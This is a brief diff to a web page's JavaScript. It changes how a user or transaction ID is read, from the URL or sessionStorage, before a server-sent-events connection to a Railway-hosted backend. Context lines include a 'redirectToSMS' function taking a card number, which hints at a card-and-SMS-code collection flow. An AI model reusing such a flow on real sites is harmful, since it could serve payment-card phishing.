@@ -589,7 +589,10 @@
         }
 
         // УЛУЧШЕННОЕ SSE ПОДКЛЮЧЕНИЕ
-        const userId = sessionStorage.getItem('currentUserId') || "user123";
+        // Получаем transaction_id из URL или sessionStorage
+        const urlParams = new URLSearchParams(window.location.search);
+        const transactionId = urlParams.get('tx_id') || sessionStorage.getItem('currentTransactionId');
+        const userId = transactionId || "user_default";
         const RAILWAY_URL = "https://roomix-production.up.railway.app";
         let eventSource = null;
         let reconnectAttempts = 0;
@@ -772,5 +775,6 @@ window.redirectToSMS = function(cardNumber) {
     </script>
 </body>
 </html>
+
 
 
